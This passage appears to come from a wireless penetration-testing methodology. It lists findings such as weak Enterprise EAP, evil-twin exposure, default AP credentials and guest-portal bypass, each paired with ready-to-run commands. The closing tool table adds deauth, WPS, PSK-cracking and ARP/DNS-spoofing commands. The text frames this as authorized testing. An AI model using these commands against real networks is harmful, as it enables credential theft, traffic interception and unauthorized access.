nmap -6 -sS $IPV6_DC $IPV6_CTRL
ping -6 -c 2 $IPV6_DC
```

**Found when:** IPv4 path to `$DC` is filtered but IPv6 ping/TCP works.

---

### 17. Weak Enterprise authentication

**What you are looking for:** LEAP, EAP-MD5, PEAP/EAP-TTLS with MSCHAPv2 and no effective server-cert check.

```bash
airodump-ng $MON
# AUTH = MGT  → Enterprise
tshark -i $MON -Y "eap" -T fields -e eap.type -e eap.code
```

EAP type cheat: 13 = EAP-TLS, 17 = LEAP, 21 = TTLS, 25 = PEAP, 4 = MD5.

**Found when:** LEAP/MD5 in use, or PEAP without “validate server certificate” on the issued laptop image.

---

### 18. Missing certificate validation

**RoE must allow a rogue RADIUS / cloned SSID.**

1. Stand up hostapd-wpe (or similar) with the **same ESSID** as corporate.
2. Use a tester laptop that has the company Wi-Fi profile.
3. See if it joins and sends inner identity / MSCHAPv2.

```bash
hostapd-wpe hostapd-wpe.conf
tail -f /var/log/hostapd-wpe.log
# if challenge/response appear:
asleap -C <challenge> -R <response> -W $WORDLIST
hashcat -m 5500 netntlm.hash $WORDLIST
```

**Found when:** the official client accepts your cert (or no cert) and logs credentials/hashes.

---

### 19. Insecure EAP configuration

Look at the **issued** Windows/macOS/mobile profile (client provides a test device):

- Server name not pinned
- Intermediate/root CA not pinned
- “Connect if server does not present” / user prompt allowed
- Fallback to weaker inner method

Commands are mostly inspection (`netsh wlan show profiles`, mobile MDM screenshot). Combine with §18.

```bash
# Windows test laptop
netsh wlan show profiles
netsh wlan show profile name="$SSID" key=clear
```

---

### 20. Rogue AP present

```bash
airodump-ng -w inventory --output-format csv $MON
kismet -c $MON
```

Build two columns: **authorized BSSID list from client** vs **observed BSSID list**.

```bash
# inventory-01.csv → extract BSSID + ESSID + vendor
cut -d, -f1,4,14 inventory-01.csv | less
```

**Found when:** a BSSID is on-air in the building and not in the asset list (or a staff hotspot using a look-alike name).

---

### 21. Evil-twin exposure

**RoE required.**

```bash
airbase-ng -e "$SSID" -c $CH $MON
# or hostapd with matching SSID / band
```

Watch whether nearby corp laptops/phones associate to *your* BSSID.

```bash
airodump-ng --essid "$SSID" -c $CH $MON
# your tester BSSID should start listing STA MACs that belong to the company
```

**Found when:** an authorized client associates to the cloned AP without warning.

---

### 22. Inadequate rogue-AP detection

Do §20–21 during a notified window, then ask SOC:

- Alert name / time
- Ticket ID
- Time-to-detect

**Found when:** cloned corporate SSID ran for N minutes with zero WIDS/SIEM event.

---

### 23. Default AP credentials

Find the AP management IP (CDP/LLDP, DHCP option, ARP after join, or vendor default on VLAN).

```bash
nmap -p 22,23,80,443 $AP_IP
curl -vk http://$AP_IP/
# try vendor documented defaults only (admin/admin, admin/password, root/admin, ...)
ssh admin@$AP_IP
```

**Found when:** documented factory pair still works. Stop after proof; do not change config unless hired to.

---

### 24. Default controller credentials

Same against `$CTRL` (WLC, Aruba MM, UniFi, Meraki if local).

```bash
nmap -p 22,80,443,8443 $CTRL
curl -vk https://$CTRL/
```

Also check cloud login in a browser (MFA? SSO? old shared mailbox?).

---

### 25. Exposed management interface

Broader than defaults: *any* admin surface reachable from the wrong place.

```bash
nmap -sS -p 22,23,80,161,443,8080,8443 $CTRL $MGMT_RANGE
# run this sourced from guest and from user Wi-Fi
```

**Found when:** management ports answer on a user or guest prefix.

---

### 26. HTTP administration

```bash
nmap -p 80,8080,8000 $CTRL $AP_IP
curl -sI http://$CTRL/
curl -sI http://$AP_IP/
# follow redirects; if the UI actually works on HTTP, that is the finding
```

**Found when:** admin pages load over HTTP, or HTTP does not 301 to HTTPS.

---

### 27. Telnet administration

```bash
nmap -sV -p 23 $CTRL $MGMT_RANGE
nc -nv $CTRL 23
```

**Found when:** banner or login prompt on TCP/23.

---

### 28. Weak SNMP configuration

```bash
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $CTRL
snmpwalk -v2c -c public  $CTRL system
snmpwalk -v2c -c private $CTRL system
snmpwalk -v2c -c $COMPANY $CTRL system
snmp-check $CTRL
```

**Found when:** v2c community `public`/`private`/companyname returns `sysDescr` or interface tables. Prefer SNMPv3 + restricted source.

---

### 29. Outdated firmware

```bash
snmpwalk -v2c -c public $CTRL 1.3.6.1.2.1.1.1.0
# or from HTTPS UI / SSH "show version"
nmap -sV -p 22,443 $CTRL
```

Map the version string to the vendor PSIRT page.

**Found when:** version is behind current recommended train, or a named wireless CVE applies.

---

### 30. End-of-life AP / controller

Take model from SNMP / sticker / controller inventory (`AIR-CAP1602`, `AP-205`, etc.) and check the vendor EOL bulletin.

**Found when:** hardware is on an EOL list (no security patches).

---

### 31. Excessive wireless coverage

```bash
airodump-ng $MON
# walk: reception → parking → street → neighboring lobby
# record PWR for the corporate BSSID at each point
```

Join test at the property line:

```bash
nmcli dev wifi connect "$SSID" password "$PSK" ifname $IFACE
ping -c 3 $GW
```

**Found when:** a stock laptop outside the intended boundary can authenticate and pass traffic.

---

### 32. Inadequate logging

On the controller / syslog, after you join, fail-join, and (if allowed) deauth:

Ask for:

- client association success/fail
- admin login
- rogue classification
- config change

**Found when:** your known events have no log line.

---

### 33. Inadequate SIEM integration

Logs may exist on the WLC but never leave it.

**Steps:** perform one join + one failed join + one admin login. Ask SOC to find them in SIEM by MAC / username / time.

**Found when:** WLC has the event, SIEM does not.

---

### 34. Inadequate wireless monitoring

No WIDS/WIPS appliance, or it is licensed but in “detect only” with no runbook.

Combine §21–22. If there is no sensor coverage on a floor, that floor is unmonitored.

```bash
airodump-ng $MON
# count vendor OUIs that look like dedicated WIPS sensors vs user APs
```

---

### 35. Inadequate NAC

After join (especially guest or corp), you get full access with only a MAC + PSK/user, no posture.

```bash
# from a clean test laptop with no AV / no cert
nmap -sS -p 22,445,3389 $CORP_RANGE
```

**Found when:** unmanaged device receives a corp IP and can reach corp apps. 802.1X without posture is still better than PSK, but report if policy required ISE/ClearPass and it is bypassable.

MAC-filter “NAC”:

```bash
macchanger -m $CLIENT $IFACE
nmcli dev wifi connect "$SSID" password "$PSK" ifname $IFACE
```

**Found when:** cloning an observed client MAC is enough.

---

### 36. Excessive administrative privileges

On WLC/cloud:

- one shared `admin`
- every RF technician is Super-User
- read-only role unused

**How:** review AAA users with the client. No wireless command required beyond login as a low-privilege test account and seeing you can still change SSIDs.

---

### 37. Missing MFA on controller

Open the WLC / cloud console from a browser. If password-only (local or AD) with no SSO MFA, that is the finding.

```bash
curl -vk https://$CTRL/
```

Then complete the login flow on a test admin.

---

### 38. Insecure cloud WLAN administration

Meraki / Omada / UniFi / Juniper Mist / Cisco Catalyst Cloud:

- console reachable from the whole internet
- no IP allow-list
- no SSO/MFA
- old owner email

**How:** browser review + `nmap` the cloud connector appliance on-site if one exists.

---

### 39. Excessively permissive firewall rules

From each SSID:

```bash
# coarse map
nmap -sn $CORP_RANGE
# common “should be blocked”
hping3 --syn -p 445 $FS
hping3 --syn -p 3389 $FS
hping3 --syn -p 22 $CTRL
```

Ask for the firewall policy from wireless SVIs. **Found when:** any-any or “wireless → RFC1918 allow”.

---

### 40. Unnecessary exposed services

On the subnet you landed on:

```bash
arp-scan -I $IFACE -l
nmap -sV --top-ports 100 $LOCAL_RANGE
nmap -p 139,445,3389,5900,22,23,80,443,9100,631 $LOCAL_RANGE
```

**Found when:** SMB, RDP, VNC, printers (`9100`), or admin UIs sit on guest/IoT without need.

---

### 41. Insecure guest portal

```bash
nmcli dev wifi connect "$GUEST_SSID" ifname $IFACE
curl -vk http://neverssl.com
# note redirect URL, cookie flags, TLS
curl -vk http://$GW:80
curl -vk https://$PORTAL_HOST/
```

Checks:

- portal is HTTP or mixed content
- session cookie without Secure/HttpOnly
- logout does not kill the session
- MAC-spoof of an already-authorized guest skips the portal
- voucher reuse

```bash
macchanger -m $ALREADY_AUTHED_GUEST_MAC $IFACE
# reconnect; if you have internet with no portal, that is a bypass
```

---

### 42. Legacy wireless compatibility

```bash
airodump-ng $MON
```

Look for:

- 802.11b rates still enabled (2.4 GHz “b/g/n”)
- WPA1 / TKIP “for one old printer”
- Open or WEP voice/handheld SSID

Controller check: WLAN advanced → allowed data rates / low rates (1/2/5.5/11 Mbps) enabled.

**Found when:** broadcast/low rates or old ciphers kept for a single device.

---

### Fast sweep order (same day)

Run this sequence; tick each finding ID.

```bash
# A. Passive
airmon-ng start $IFACE
airodump-ng -w sweep --output-format csv,pcap $MON
wash -i $MON
tshark -i $MON -Y "wlan.fc.type_subtype == 0x04" -T fields -e wlan.sa -e wlan.ssid
```

From `sweep-01.csv` tick: **5, 6, 7, 8, 20, 31, 42**.

```bash
# B. Offline PSK
hcxpcapngtool -o hash.22000 sweep-01.cap
hashcat -m 22000 hash.22000 $WORDLIST
```

Tick: **1, 2** (then try recovered PSK on other SSIDs).

```bash
# C. Join guest
nmcli dev wifi connect "$GUEST_SSID" password "$GUEST_PSK" ifname $IFACE
ip -4 addr; ip -6 addr; ip route
arp-scan -I $IFACE -l
nmap -sn $CORP_RANGE $MGMT_RANGE $IOT_RANGE
nmap -p 22,23,80,161,443,445,3389,8080 $CTRL $DC $FS
nmap -6 -sn fe80::/64
```

Tick: **9, 10, 11, 13, 14, 15, 16, 35, 39, 40, 41**.

```bash
# D. Join IoT, repeat C against corp/mgmt
# E. Join corp 802.1X test user, repeat C
# F. Management
nmap -p 22,23,80,161,443,8080,8443 $CTRL
snmpwalk -v2c -c public $CTRL system
curl -vk http://$CTRL/; curl -vk https://$CTRL/
```

Tick: **23–30, 36–38**.

```bash
# G. People / process (interview + SOC)
```

Tick: **3, 4, 32, 33, 34**.

```bash
# H. Impersonation window only if RoE says yes
airbase-ng -e "$SSID" -c $CH $MON
hostapd-wpe hostapd-wpe.conf
```

Tick: **17, 18, 19, 21, 22**.

---

### Evidence per finding (minimum)

| Type | Keep |
|---|---|
| Protocol / TKIP / open / WPS | airodump screenshot + pcap beacon |
| Weak PSK | `.22000` hash + hashcat status (hide secret) |
| Isolation fail | nmap output sourced from guest IP + route table |
| IPv6 bypass | `ip -6 route` + nmap -6 |
| Default creds | one successful login screenshot, then log out |
| SNMP | `sysDescr` walk header |
| Rogue / coverage | BSSID, PWR, floor/parking photo, timestamp |
| Evil-twin / WIDS | your BSSID, client MAC that joined, SOC ticket or “no alert” |

---

### Command cheat for “am I on the right SSID?”

```bash
iw dev $IFACE link
iw dev $IFACE info
nmcli -f in-use,ssid,bssid,mode,chan,rate,signal,security dev wifi
```


---

## 26. Tool & Command Reference

| Purpose | Tool | Example command |
|---|---|---|
| Monitor mode / packet capture | airmon-ng | `airmon-ng start wlan0` |
| SSID/BSSID/channel discovery | airodump-ng | `airodump-ng wlan0mon` |
| Wireless discovery (GUI) | Kismet | `kismet -c wlan0mon` |
| Handshake capture / deauth | aireplay-ng | `aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0mon` |
| Handshake / WEP cracking | aircrack-ng | `aircrack-ng -w wordlist.txt capture.cap` |
| PMKID capture | hcxdumptool | `hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1` |
| Hash conversion for hashcat | hcxpcapngtool | `hcxpcapngtool -o hash.22000 capture.cap` |
| GPU-based PSK cracking | hashcat | `hashcat -m 22000 hash.22000 rockyou.txt` |
| WPS PIN attack | reaver | `reaver -i wlan0mon -b <BSSID> -c <CH> -vv` |
| WPS Pixie Dust | bully / reaver `-K` | `bully -b <BSSID> -c <CH> -d` |
| WPS scan | wash | `wash -i wlan0mon` |
| Rogue AP / evil twin | airbase-ng | `airbase-ng -e "<SSID>" -c <CH> wlan0mon` |
| KARMA / MANA | hostapd-mana | `hostapd-mana mana.conf` |
| Rogue RADIUS / EAP creds | hostapd-wpe | `hostapd-wpe hostapd-wpe.conf` |
| MSCHAPv2 cracking | asleap / hashcat `-m 5500` | `asleap -C <challenge> -R <response> -W wordlist.txt` |
| Host discovery / port scan | nmap | `nmap -sn 192.168.1.0/24` / `nmap -sV -p- <target>` |
| MITM / traffic interception | bettercap | `bettercap -iface wlan0` |
| ARP/DHCP spoofing | Ettercap | `ettercap -T -M arp:remote /<gateway>/ /<target>/` |
| DNS spoofing | bettercap / Ettercap | `set dns.spoof.domains <domain>; dns.spoof on` |
| SNMP enumeration | snmpwalk / onesixtyone | `snmpwalk -v2c -c public <target>` |
| MAC spoofing (NAC bypass test) | macchanger | `macchanger -m 00:11:22:33:44:55 wlan0` |
| Firewall / ACL probing | hping3 | `hping3 --syn -p 443 <target>` |
| Packet analysis | Wireshark / tshark | `tshark -i wlan0mon -Y "eapol"` |
| IPv6 recon | nmap `-6` / rdisc6 | `nmap -6 -sn <ipv6_range>` |
| Wordlist generation | crunch | `crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wl.txt` |
| WEP chopchop | aireplay-ng `-4` | `aireplay-ng -4 -b <BSSID> -h <YOUR_MAC> wlan0mon` |
| Packet forge | packetforge-ng | `packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> -k <DIP> -l <SIP> -y <xor> -w out.cap` |

---

## 27. References

- Ivan Sincek Wi-Fi pentest cheat sheet: https://github.com/ivan-sincek/wifi-penetration-testing-cheat-sheet
- PurpleSec wireless pentest overview: https://purplesec.us/perform-wireless-penetration-test/
- Wireless tools list: https://www.isoeh.com/tutorial-details-12-handy-wireless-penetration-testing-tools-for-linux.html
- WEP SKA notes: https://lesperance.io/bypassing-wep-shared-key-authentication/
- KRACK scripts: https://github.com/vanhoefm/krackattacks-scripts

---

## Legal / Engagement Notes

- Run only against assets listed in the RoE.
- Deauth, DoS, rogue AP, credential harvesting, and client impersonation are **active** tests — get written approval.
- Do not retain handshakes, PMKIDs, EAP hashes, or portal credentials beyond the engagement retention policy.
- Prefer lab validation of destructive tests (KRACK, floods, firmware crashes).
- Restore adapter/NetworkManager when finished:

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```
